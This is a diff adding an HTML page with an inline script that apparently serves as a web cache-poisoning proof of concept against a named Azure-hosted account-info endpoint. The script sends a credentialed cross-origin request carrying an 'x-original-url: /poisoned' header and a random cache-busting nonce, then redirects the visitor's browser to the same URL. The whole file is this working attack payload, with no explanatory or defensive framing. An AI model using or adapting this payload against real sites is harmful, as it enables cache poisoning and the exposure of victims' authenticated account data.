@@ -1,0 +1,25 @@
+<html><script>
+
+window.nonce = Math.random( ).toString( 36 ).substr( 2, 5 )
+
+      fetch( 'https://ergossauth.azurewebsites.net/account/info?n=' + window.nonce, {
+            method: 'GET',
+            mode: 'cors',
+            cache: 'reload',
+            redirect: 'follow',
+            credentials: 'include',
+            headers: {
+                  'x-original-url': '/poisoned'
+            }
+      } )
+      .catch( ( ) => { } )
+      .then( ( ) => { 
+
+        setTimeout( function( ) { 
+
+            window.location.replace( 'https://ergossauth.azurewebsites.net/account/info?n=' + window.nonce );
+
+        }, 200 );
+
+      } );
+</html></script>
